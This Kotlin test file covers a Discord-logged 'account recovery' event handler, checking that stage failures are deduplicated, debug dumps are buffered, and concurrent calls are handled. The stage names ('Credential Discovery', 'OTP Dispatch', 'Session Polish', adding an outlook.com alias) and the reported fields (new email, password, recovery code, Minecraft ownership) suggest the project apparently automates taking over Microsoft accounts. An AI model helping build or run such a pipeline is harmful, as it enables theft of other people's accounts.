package event.events

import database.model.RecoveredAccount
import database.repository.AccountRepository
import discord.DiscordLogger
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.runBlocking
import microsoft.recovery.RecoveryService
import java.util.concurrent.CopyOnWriteArrayList
import java.util.concurrent.atomic.AtomicInteger
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertNull
import kotlin.test.assertTrue

class RecoveryInteractionEventTest {

    private class RecordingDiscordLogger : DiscordLogger() {
        val stageLogs = CopyOnWriteArrayList<String>()
        val detailedFailures = CopyOnWriteArrayList<DetailedFailureCall>()
        val finalResults = CopyOnWriteArrayList<Boolean>()

        data class DetailedFailureCall(
            val logChannelId: Long,
            val stageName: String,
            val errorReason: String,
            val debugContext: String?,
        )

        override suspend fun logStage(
            logChannelId: Long,
            stageKey: String,
            stageName: String,
            isSuccess: Boolean,
            detail: String,
        ): Unit {
            stageLogs.add("$stageKey:$stageName:$isSuccess:$detail")
        }

        override suspend fun sendDetailedFailure(
            logChannelId: Long,
            stageName: String,
            errorReason: String,
            debugContext: String?,
        ): Unit {
            detailedFailures.add(
                DetailedFailureCall(
                    logChannelId = logChannelId,
                    stageName = stageName,
                    errorReason = errorReason,
                    debugContext = debugContext,
                ),
            )
        }

        override suspend fun sendFinalResult(
            notiChannelId: Long,
            isSuccess: Boolean,
            ign: String,
            originalEmail: String,
            newEmail: String?,
            password: String?,
            recoveryCode: String?,
            errorReason: String?,
        ): Unit {
            finalResults.add(isSuccess)
        }
    }

    private val stubAccountRepository = object : AccountRepository {
        override suspend fun saveAccount(account: RecoveredAccount): Boolean = true
        override suspend fun getAccountByEmail(email: String): RecoveredAccount? = null
        override suspend fun getAccountByOriginalEmail(originalEmail: String): RecoveredAccount? = null
        override suspend fun updateMinecraftStatus(email: String, owns: Boolean): Unit = Unit
        override suspend fun updateStatus(originalEmail: String, status: String, failReason: String?): Boolean = true
        override suspend fun deleteByOriginalEmail(originalEmail: String): Boolean = true
        override suspend fun getAllAccounts(): List<RecoveredAccount> = emptyList()
    }

    @Test
    fun testStageListenerSuppressesDiscordEmbedsOnSuccess(): Unit = runBlocking {
        val logger = RecordingDiscordLogger()
        val eventHandler = RecoveryInteractionEvent(
            recoveryService = RecoveryService(),
            discordLogger = logger,
            accountRepository = stubAccountRepository,
        )

        var failureReported = false
        val listener = eventHandler.createStageListener(
            logChannelId = 9999L,
            discordLogger = logger,
            onFailureLogged = { failureReported = true },
        )

        listener("1", "Credential Discovery", true, "Account found")
        listener("2", "OTP Dispatch", true, "OTP sent successfully")
        listener("3", "Session Polish", true, "Polished session cookies")

        assertEquals(0, logger.stageLogs.size)
        assertEquals(0, logger.detailedFailures.size)
        assertTrue(!failureReported)
    }

    @Test
    fun testStageListenerBuffersDebugContextOnDebugStagesWithoutDiscordEmission(): Unit = runBlocking {
        val logger = RecordingDiscordLogger()
        val eventHandler = RecoveryInteractionEvent(
            recoveryService = RecoveryService(),
            discordLogger = logger,
            accountRepository = stubAccountRepository,
        )

        var debugDump: String? = null
        val listener = eventHandler.createStageListener(
            logChannelId = 9999L,
            discordLogger = logger,
            onDebugUpdate = { debugDump = it },
        )

        val sampleHtml = "<html><head><title>Sign in</title></head><body>form</body></html>"
        listener("3-debug", "Stage 3 Debug Dump", true, sampleHtml)

        assertEquals(0, logger.stageLogs.size)
        assertEquals(0, logger.detailedFailures.size)
        assertEquals(sampleHtml, debugDump)
    }

    @Test
    fun testStageListenerAttachesBufferedDebugContextOnFailure(): Unit = runBlocking {
        val logger = RecordingDiscordLogger()
        val eventHandler = RecoveryInteractionEvent(
            recoveryService = RecoveryService(),
            discordLogger = logger,
            accountRepository = stubAccountRepository,
        )

        var failureReported = false
        val listener = eventHandler.createStageListener(
            logChannelId = 9999L,
            discordLogger = logger,
            onFailureLogged = { failureReported = true },
        )

        val debugSnippet = "Status: 200 | Location: none\n```html\n<div>error</div>\n```"
        listener("3-debug", "Stage 3 Debug Dump", true, debugSnippet)

        assertEquals(0, logger.detailedFailures.size)
        assertTrue(!failureReported)

        listener("3", "Stage 3 Polish", false, "Canary token not found")

        assertTrue(failureReported)
        assertEquals(1, logger.detailedFailures.size)
        val failure = logger.detailedFailures[0]
        assertEquals(9999L, failure.logChannelId)
        assertEquals("Stage 3 Polish", failure.stageName)
        assertEquals("Canary token not found", failure.errorReason)
        assertEquals(debugSnippet, failure.debugContext)
        assertEquals(0, logger.stageLogs.size)
    }

    @Test
    fun testStageListenerHandlesStage8DebugAndFailure(): Unit = runBlocking {
        val logger = RecordingDiscordLogger()
        val eventHandler = RecoveryInteractionEvent(
            recoveryService = RecoveryService(),
            discordLogger = logger,
            accountRepository = stubAccountRepository,
        )

        var failureReported = false
        val listener = eventHandler.createStageListener(
            logChannelId = 8888L,
            discordLogger = logger,
            onFailureLogged = { failureReported = true },
        )

        val stage8Debug = "**Headers:**\n```text\nCookie: masked\n```\n**Form Parameters:**\n```text\nSingleDomain: outlook.com\n```"
        listener("8-debug", "Stage 8 Request Debug", true, stage8Debug)

        assertEquals(0, logger.detailedFailures.size)

        listener("8", "Stage 8 Alias", false, "AddAssocId returned redirect to login")

        assertTrue(failureReported)
        assertEquals(1, logger.detailedFailures.size)
        val failure = logger.detailedFailures[0]
        assertEquals(8888L, failure.logChannelId)
        assertEquals("Stage 8 Alias", failure.stageName)
        assertEquals("AddAssocId returned redirect to login", failure.errorReason)
        assertEquals(stage8Debug, failure.debugContext)
    }

    @Test
    fun testStageListenerFailureWithoutPriorDebugHasNullDebugContext(): Unit = runBlocking {
        val logger = RecordingDiscordLogger()
        val eventHandler = RecoveryInteractionEvent(
            recoveryService = RecoveryService(),
            discordLogger = logger,
            accountRepository = stubAccountRepository,
        )

        var failureReported = false
        val listener = eventHandler.createStageListener(
            logChannelId = 7777L,
            discordLogger = logger,
            onFailureLogged = { failureReported = true },
        )

        listener("1", "Credential Discovery", false, "Account does not exist")

        assertTrue(failureReported)
        assertEquals(1, logger.detailedFailures.size)
        val failure = logger.detailedFailures[0]
        assertEquals(7777L, failure.logChannelId)
        assertEquals("Credential Discovery", failure.stageName)
        assertEquals("Account does not exist", failure.errorReason)
        assertNull(failure.debugContext)
    }

    @Test
    fun testStageListenerDeduplicatesSequentialFailures(): Unit = runBlocking {
        val logger = RecordingDiscordLogger()
        val eventHandler = RecoveryInteractionEvent(
            recoveryService = RecoveryService(),
            discordLogger = logger,
            accountRepository = stubAccountRepository,
        )

        var failureReportedCount = 0
        val listener = eventHandler.createStageListener(
            logChannelId = 9999L,
            discordLogger = logger,
            onFailureLogged = { failureReportedCount++ },
        )

        listener("1", "Credential Discovery", false, "First failure")
        listener("2", "OTP Dispatch", false, "Second failure")
        listener("3", "Session Polish", false, "Third failure")

        assertEquals(1, failureReportedCount)
        assertEquals(1, logger.detailedFailures.size)
        val failure = logger.detailedFailures[0]
        assertEquals("Credential Discovery", failure.stageName)
        assertEquals("First failure", failure.errorReason)
    }

    @Test
    fun testStageListenerDeduplicatesConcurrentFailures(): Unit = runBlocking {
        val logger = RecordingDiscordLogger()
        val eventHandler = RecoveryInteractionEvent(
            recoveryService = RecoveryService(),
            discordLogger = logger,
            accountRepository = stubAccountRepository,
        )

        val failureCallbackCount = AtomicInteger(0)
        val listener = eventHandler.createStageListener(
            logChannelId = 9999L,
            discordLogger = logger,
            onFailureLogged = { failureCallbackCount.incrementAndGet() },
        )

        coroutineScope {
            (1..20).map { i ->
                async(Dispatchers.Default) {
                    listener("stage-$i", "Stage $i", false, "Failure $i")
                }
            }.awaitAll()
        }

        assertEquals(1, failureCallbackCount.get())
        assertEquals(1, logger.detailedFailures.size)
    }

    @Test
    fun testStageListenerConcurrentDebugUpdatesAndSingleFailure(): Unit = runBlocking {
        val logger = RecordingDiscordLogger()
        val eventHandler = RecoveryInteractionEvent(
            recoveryService = RecoveryService(),
            discordLogger = logger,
            accountRepository = stubAccountRepository,
        )

        val failureCallbackCount = AtomicInteger(0)
        val listener = eventHandler.createStageListener(
            logChannelId = 9999L,
            discordLogger = logger,
            onFailureLogged = { failureCallbackCount.incrementAndGet() },
        )

        listener("3-debug", "Stage 3 Debug Dump", true, "initial debug context")

        coroutineScope {
            val debugJobs = (1..10).map { i ->
                async(Dispatchers.Default) {
                    listener("3-debug", "Stage 3 Debug Dump", true, "debug context $i")
                }
            }
            val failureJobs = (1..10).map { i ->
                async(Dispatchers.Default) {
                    listener("stage-$i", "Stage $i", false, "Failure $i")
                }
            }
            (debugJobs + failureJobs).awaitAll()
        }

        assertEquals(1, failureCallbackCount.get())
        assertEquals(1, logger.detailedFailures.size)
        val failure = logger.detailedFailures[0]
        assertTrue(failure.debugContext != null)
    }
}
